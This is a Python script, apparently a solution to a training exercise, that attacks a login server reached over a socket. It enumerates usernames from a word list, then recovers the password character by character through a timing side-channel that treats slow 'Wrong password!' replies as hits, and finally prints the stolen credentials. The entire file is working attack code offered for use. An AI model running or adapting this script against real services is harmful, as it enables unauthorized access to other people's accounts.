import socket
import sys
import json
import string
import datetime as d
password = ""


def login_finder():
    with open("logins.txt", "r", encoding="utf8") as f:
        for line in f:
            log_pass = {"login": line.strip(), "password": ""}
            log_pass = json.dumps(log_pass)
            my_socket.send(log_pass.encode())
            response = my_socket.recv(1024)
            if "Wrong login!" in response.decode():
                continue
            else:
                log_id = line.strip()
                password_finder(log_id)
                break


def password_finder(log_id):
    global password
    pass_data = string.ascii_lowercase + string.ascii_uppercase + string.digits
    flag = 0
    n = 0
    while True:
        for i in pass_data:
            log_pass = {"login": log_id, "password": password + i}
            log_pass = json.dumps(log_pass)
            my_socket.send(log_pass.encode())
            start = d.datetime.now()
            response = my_socket.recv(1024)
            finish = (d.datetime.now())
            difference = finish - start
            if difference.total_seconds() >= 0.1 and "Wrong password!" in response.decode():
                password += i
            elif "Connection success!" in response.decode():
                password += i
                flag = 1
                break
            else:
                continue
        if flag == 1:
            break
        n += 1
    credentials = {"login": log_id, "password": password}
    credentials = json.dumps(credentials, indent=4)
    print(credentials)


args = sys.argv

my_socket = socket.socket()
my_socket.connect((args[1], int(args[2])))
login_finder()
my_socket.close()

